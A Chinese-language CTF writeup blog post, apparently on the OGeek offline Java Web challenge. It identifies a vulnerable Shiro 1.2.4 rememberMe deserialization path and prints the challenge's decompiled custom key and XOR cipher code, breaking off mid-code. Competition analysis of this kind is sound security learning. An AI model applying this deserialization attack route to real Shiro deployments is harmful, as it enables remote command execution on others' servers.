<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>OGeek 线下 Java Web And XCTF Final babytaint Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.
拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃"><meta property="og:image" content><meta property="og:title" content="OGeek 线下 Java Web And XCTF Final babytaint Writeup"><meta property="og:description" content="因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.
拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-10-31T22:37:15+00:00"><meta property="article:modified_time" content="2019-10-31T22:37:15+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="OGeek 线下 Java Web And XCTF Final babytaint Writeup"><meta name=twitter:description content="因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.
拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>OGeek 线下 Java Web And XCTF Final babytaint Writeup</h1><div class=meta>发表于 2019 年 10 月 31 日</div></div><section class=body><p>因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.<br>拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃</p><h2 id=java-web>Java Web</h2><p>这题运气比较好, 拿了一血<br>拿到题目可以看到一堆 jsp, 可以确定是 java web.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ tree -L 2 . --dirsfirst
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>├── css
</span></span><span style=display:flex><span>│   ├── main.css
</span></span><span style=display:flex><span>│   └── util.css
</span></span><span style=display:flex><span>├── fonts
</span></span><span style=display:flex><span>│   ├── font-awesome-4.7.0
</span></span><span style=display:flex><span>│   ├── iconic
</span></span><span style=display:flex><span>│   └── poppins
</span></span><span style=display:flex><span>├── images
</span></span><span style=display:flex><span>│   ├── icons
</span></span><span style=display:flex><span>│   └── bg-01.jpg
</span></span><span style=display:flex><span>├── js
</span></span><span style=display:flex><span>│   └── main.js
</span></span><span style=display:flex><span>├── META-INF
</span></span><span style=display:flex><span>│   └── MANIFEST.MF
</span></span><span style=display:flex><span>├── vendor
</span></span><span style=display:flex><span>│   ├── animate
</span></span><span style=display:flex><span>│   ├── animsition
</span></span><span style=display:flex><span>│   ├── bootstrap
</span></span><span style=display:flex><span>│   ├── countdowntime
</span></span><span style=display:flex><span>│   ├── css-hamburgers
</span></span><span style=display:flex><span>│   ├── daterangepicker
</span></span><span style=display:flex><span>│   ├── jquery
</span></span><span style=display:flex><span>│   ├── perfect-scrollbar
</span></span><span style=display:flex><span>│   └── select2
</span></span><span style=display:flex><span>├── WEB-INF
</span></span><span style=display:flex><span>│   ├── classes
</span></span><span style=display:flex><span>│   ├── lib
</span></span><span style=display:flex><span>│   └── web.xml
</span></span><span style=display:flex><span>├── error.jsp
</span></span><span style=display:flex><span>├── index.jsp
</span></span><span style=display:flex><span>├── login.jsp
</span></span><span style=display:flex><span>└── success.jsp
</span></span></code></pre></div><p>逻辑比较简单, 漏洞也不在这些 jsp 里面</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span style=display:flex><span>&lt;%@taglib prefix=&#34;shiro&#34; uri=&#34;http://shiro.apache.org/tags&#34; %&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>&lt;html lang=&#34;en&#34;&gt;
</span></span><span style=display:flex><span>&lt;head&gt;
</span></span><span style=display:flex><span>    &lt;title&gt;Login V3&lt;/title&gt;
</span></span><span style=display:flex><span>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span><span style=display:flex><span>    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span><span style=display:flex><span>    &lt;!--===============================================================================================--&gt;
</span></span><span style=display:flex><span>    &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/icons/favicon.ico&#34;/&gt;
</span></span><span style=display:flex><span>    &lt;!--===============================================================================================--&gt;
</span></span><span style=display:flex><span>    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34;&gt;
</span></span><span style=display:flex><span>    &lt;!--===============================================================================================--&gt;
</span></span><span style=display:flex><span>    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/font-awesome-4.7.0/css/font-awesome.min.css&#34;&gt;
</span></span><span style=display:flex><span>    &lt;!--===============================================================================================--&gt;
</span></span><span style=display:flex><span>    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;fonts/iconic/css/material-design-iconic-font.min.css&#34;&gt;
</span></span><span style=display:flex><span>    &lt;!--===============================================================================================--&gt;
</span></span><span style=display:flex><span>&lt;!-- 省略掉一些 html --&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!--
</span></span><span style=display:flex><span>&lt;form action=&#34;/register&#34; method=&#34;POST&#34;&gt;
</span></span><span style=display:flex><span>    &lt;input type=&#34;text&#34; name=&#34;username&#34; value=&#34;&#34;&gt;&lt;br&gt;
</span></span><span style=display:flex><span>    &lt;input type=&#34;text&#34; name=&#34;password&#34; value=&#34;&#34;&gt;&lt;br&gt;
</span></span><span style=display:flex><span>    &lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;submit&#34;&gt;&lt;br&gt;
</span></span><span style=display:flex><span>&lt;/form&gt;
</span></span><span style=display:flex><span>--&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span><span style=display:flex><span>&lt;/html&gt;
</span></span></code></pre></div><p>可以看到 shiro, 注意 <code>WEB-INF/lib/</code> 里面的 <code>shiro-core-1.2.4.jar</code> 是存在漏洞的版本, 可以利用 java 反序列化执行命令.
遂直接用了之前的找的 exp, 但是 JRMPClient 并没有回连的反应, 再看看 web.xml</p><p>web.xml</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>  <span style=color:#ff79c6>&lt;context-param&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;param-name&gt;</span>contextConfigLocation<span style=color:#ff79c6>&lt;/param-name&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;param-value&gt;</span>
</span></span><span style=display:flex><span>      classpath:spring-shiro.xml
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/param-value&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;/context-param&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;listener&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span style=color:#ff79c6>&lt;/listener-class&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;/listener&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;filter&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;filter-name&gt;</span>shiroFilter<span style=color:#ff79c6>&lt;/filter-name&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;filter-class&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span style=color:#ff79c6>&lt;/filter-class&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;async-supported&gt;</span>true<span style=color:#ff79c6>&lt;/async-supported&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;init-param&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>&lt;param-name&gt;</span>targetFilterLifecycle<span style=color:#ff79c6>&lt;/param-name&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>&lt;param-value&gt;</span>true<span style=color:#ff79c6>&lt;/param-value&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/init-param&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;/filter&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;filter-mapping&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;filter-name&gt;</span>shiroFilter<span style=color:#ff79c6>&lt;/filter-name&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;url-pattern&gt;</span>/*<span style=color:#ff79c6>&lt;/url-pattern&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>&lt;/filter-mapping&gt;</span>
</span></span></code></pre></div><p>找到 WEB-INF/classes/spring-shiro.xml</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#6272a4>&lt;!-- 省略掉一些没用的配置 --&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>&lt;!-- rememberMe管理器 --&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;bean</span> <span style=color:#50fa7b>id=</span><span style=color:#f1fa8c>&#34;rememberMeManager&#34;</span> <span style=color:#50fa7b>class=</span><span style=color:#f1fa8c>&#34;com.collection.shiro.manager.ShiroRememberManager&#34;</span><span style=color:#ff79c6>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;property</span> <span style=color:#50fa7b>name=</span><span style=color:#f1fa8c>&#34;cookie&#34;</span> <span style=color:#50fa7b>ref=</span><span style=color:#f1fa8c>&#34;rememberMeCookie&#34;</span><span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/bean&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>&lt;!-- 省略掉一些没用的配置 --&gt;</span>
</span></span></code></pre></div><p>可以看到出题人用了自己实现的 rememberMeManager, 我们掏出 jd-gui 看看.</p><p>WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> <span style=color:#50fa7b>getKeyFromConfig</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        InputStream fileInputStream <span style=color:#ff79c6>=</span> getClass<span style=color:#ff79c6>().</span><span style=color:#50fa7b>getResourceAsStream</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;remember.key&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        String key <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>fileInputStream <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>||</span> fileInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>available</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&lt;</span> 32<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        BufferedWriter writer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> BufferedWriter<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileWriter<span style=color:#ff79c6>(</span>getClass<span style=color:#ff79c6>().</span><span style=color:#50fa7b>getResource</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;/&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getPath</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;com/collection/shiro/manager/remember.key&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        key <span style=color:#ff79c6>=</span> RandomStringUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>random</span><span style=color:#ff79c6>(</span>32<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_=&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>write</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytes <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>fileInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>available</span><span style=color:#ff79c6>()];</span>
</span></span><span style=display:flex><span>        fileInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>read</span><span style=color:#ff79c6>(</span>bytes<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        key <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>(</span>bytes<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fileInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span>        key <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Md5Hash<span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>)).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> key<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getBytes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>Exception e<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>printStackTrace</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>ShiroCipherService</span> <span style=color:#8be9fd;font-style:italic>implements</span> CipherService <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>public</span> ByteSource <span style=color:#50fa7b>decrypt</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> ciphertext<span style=color:#ff79c6>,</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> key<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> CryptoException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    String skey <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Sha1Hash<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>))).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bkey <span style=color:#ff79c6>=</span> skey<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getBytes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> data_bytes <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>ciphertext<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> ciphertext<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> i<span style=color:#ff79c6>++)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      data_bytes<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>)(</span>ciphertext<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>^</span> bkey<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>%</span> bkey<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> jsonData <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>ciphertext<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>/</span> 2<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> jsonData<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> i<span style=color:#ff79c6>++)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      jsonData<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>)(</span>data_bytes<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>*</span> 2<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>^</span> data_bytes<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>*</span> 2 <span style=color:#ff79c6>+</span> 1<span style=color:#ff79c6>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    JSONObject jsonObject <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> JSONObject<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>(</span>jsonData<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>    String serial <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>)</span>jsonObject<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;serialize_data&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ByteSource<span style=color:#ff79c6>.</span><span style=color:#50fa7b>Util</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>bytes</span><span style=color:#ff79c6>(</span>Base64<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDecoder</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>decode</span><span style=color:#ff79c6>(</span>serial<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>public</span> ByteSource <span style=color:#50fa7b>encrypt</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> plaintext<span style=color:#ff79c6>,</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> key<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> CryptoException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    String sign <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Md5Hash<span style=color:#ff79c6>(</span>UUID<span style=color:#ff79c6>.</span><span style=color:#50fa7b>randomUUID</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>())).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;asfda-92u134-&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    Subject subject <span style=color:#ff79c6>=</span> SecurityUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getSubject</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    HttpServletRequest servletRequest <span style=color:#ff79c6>=</span> WebUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getHttpRequest</span><span style=color:#ff79c6>(</span>subject<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    String user_agent <span style=color:#ff79c6>=</span> servletRequest<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getHeader</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;User-Agent&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    String ip_address <span style=color:#ff79c6>=</span> servletRequest<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getHeader</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;X-Forwarded-For&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    ip_address <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>ip_address <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>?</span> servletRequest<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getRemoteAddr</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>:</span> ip_address<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    String data <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;{\&#34;user_is_login\&#34;:\&#34;1\&#34;,\&#34;sign\&#34;:\&#34;&#34;</span> <span style=color:#ff79c6>+</span> sign <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;\&#34;,\&#34;ip_address\&#34;:\&#34;&#34;</span> <span style=color:#ff79c6>+</span> ip_address <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;\&#34;,\&#34;user_agent\&#34;:\&#34;&#34;</span> <span style=color:#ff79c6>+</span> user_agent <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;\&#34;,\&#34;serialize_data\&#34;:\&#34;&#34;</span> <span style=color:#ff79c6>+</span> Base64<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getEncoder</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>encodeToString</span><span style=color:#ff79c6>(</span>plaintext<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;\&#34;}&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> data_bytes <span style=color:#ff79c6>=</span> data<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getBytes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> okey <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Sha1Hash<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>))).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getBytes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> mkey <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Sha1Hash<span style=color:#ff79c6>(</span>UUID<span style=color:#ff79c6>.</span><span style=color:#50fa7b>randomUUID</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>())).</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getBytes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> out <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>2 <span style=color:#ff79c6>*</span> data_bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> data_bytes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> i<span style=color:#ff79c6>++)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>      out<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>*</span> 2<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> mkey<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>%</span> mkey<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span>      out<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>*</span> 2 <span style=color:#ff79c6>+</span> 1<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>byte</span><span style=color:#ff79c6>)(</span>mkey<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>%</span> mkey<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>]</span> <span style=color:#ff79c6>^</span> data_bytes<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> result <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[</span>out<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>];</span>
